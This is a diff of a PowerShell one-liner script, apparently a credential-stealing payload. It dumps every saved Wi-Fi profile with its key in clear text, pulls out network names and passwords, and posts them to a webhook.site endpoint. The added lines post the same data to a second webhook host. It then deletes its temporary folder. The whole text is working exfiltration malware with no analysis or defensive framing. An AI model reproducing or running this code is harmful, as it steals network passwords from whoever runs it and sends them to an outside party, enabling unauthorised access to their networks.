@@ -3,3 +3,6 @@ $p=Join-Path $env:TEMP 'p';New-Item -Path $p -ItemType Directory -Force -EA Sile
 #comprimido
 
 $p="$env:TEMP\p";md $p -f|Out-Null;cd $p;netsh wlan export profile key=clear|Out-Null;$r=ls *.xml|%{$x=[xml](gc $_.FullName -ea 0);if($x.WLANProfile.Name -and $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial){[PSCustomObject]@{S=$x.WLANProfile.Name;P=$x.WLANProfile.MSM.Security.SharedKey.KeyMaterial}}};$f=($r|%{"$($_.S)>>$($_.P)"}) -join "`n";$c="r`n$f`n``````";$b=[Text.Encoding]::UTF8.GetBytes($c);if($b){irm https://webhook.site/75342571-78da-45fc-8f61-caf01ffc1f5f -me Post -bo $b -con 'text/plain; charset=utf-8' -ea 0};cd ..;rm $p -r -fo -ea 0
+
+
+$p="$env:TEMP\p";md $p -f|Out-Null;cd $p;netsh wlan export profile key=clear|Out-Null;$r=ls *.xml|%{$x=[xml](gc $_.FullName -ea 0);if($x.WLANProfile.Name -and $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial){[PSCustomObject]@{S=$x.WLANProfile.Name;P=$x.WLANProfile.MSM.Security.SharedKey.KeyMaterial}}};$f=($r|%{"$($_.S)>>$($_.P)"}) -join "`n";$c="r`n$f`n``````";$b=[Text.Encoding]::UTF8.GetBytes($c);if($b){irm https://n8n.caju.dpdns.org/webhook/bot -me Post -bo $b -con 'text/plain; charset=utf-8' -ea 0};cd ..;rm $p -r -fo -ea 0
